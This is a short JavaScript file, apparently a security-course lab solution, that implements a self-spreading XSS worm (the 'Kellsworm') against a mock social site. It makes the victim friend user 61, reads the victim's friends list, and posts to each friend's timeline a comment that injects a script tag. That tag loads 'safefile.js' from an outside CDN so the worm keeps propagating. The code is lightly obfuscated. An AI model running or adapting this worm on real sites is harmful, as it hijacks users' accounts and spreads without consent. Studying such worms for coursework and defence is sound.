// Obfuscation 1, shorten variables , remove comments, shorten function names, and remove empty lines
$.get("add_friend.php", {'id': 61}, function(s) {
    if(s.includes("True")) {
        var cd = new Date().toString();
        $.get("add_comment.php", {'id': 61, 'comment': "I friended Sean Kells on " + cd});
    }
});
$.get("friends.php", function(ff) {
    var fL = ff.split(",");
    for (let i = 0; i < fL.length; i++) {
        var fID = fL[i];
        if (isNaN(fID)) {
            fID = fID.slice(0, fID.indexOf('<'));
        }
        mc(fID);
    }
});
function mc(fID) { 
    $.get("timeline.php", {'id': fID}, function(p) {
        if (!p.includes("Kellsworm")) {
            $.get("add_comment.php", {'id': fID, 'comment': 'Kellsworm <script src="https://cdn.jsdelivr.net/gh/spk3077/csec380@main/safefile.js"></script>'});
        }
    });
}
